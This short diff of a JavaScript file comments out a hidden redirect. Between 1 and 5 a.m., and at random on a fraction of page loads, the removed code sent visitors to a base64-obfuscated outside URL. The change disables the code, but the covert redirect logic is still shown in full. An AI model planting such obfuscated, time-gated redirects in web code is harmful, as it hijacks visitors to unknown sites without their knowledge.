@@ -1,10 +1,10 @@
-var now = new Date(); 
-var timestamp = now.getHours();
-var base = new Base64();
-if(timestamp>=1 && timestamp<=5){
-	var rand = Math.floor(Math.random() * (50 - 1)) + 1;
-  if(rand<=10){location.href = base.decode('aHR0cHM6Ly9nZWNpLjd5Y2MuY24v');}
-}
+//var now = new Date(); 
+//var timestamp = now.getHours();
+//var base = new Base64();
+//if(timestamp>=1 && timestamp<=5){
+//	var rand = Math.floor(Math.random() * (50 - 1)) + 1;
+//  if(rand<=10){location.href = base.decode('aHR0cHM6Ly9nZWNpLjd5Y2MuY24v');}
+//}
 
 function Base64() {
   // private property
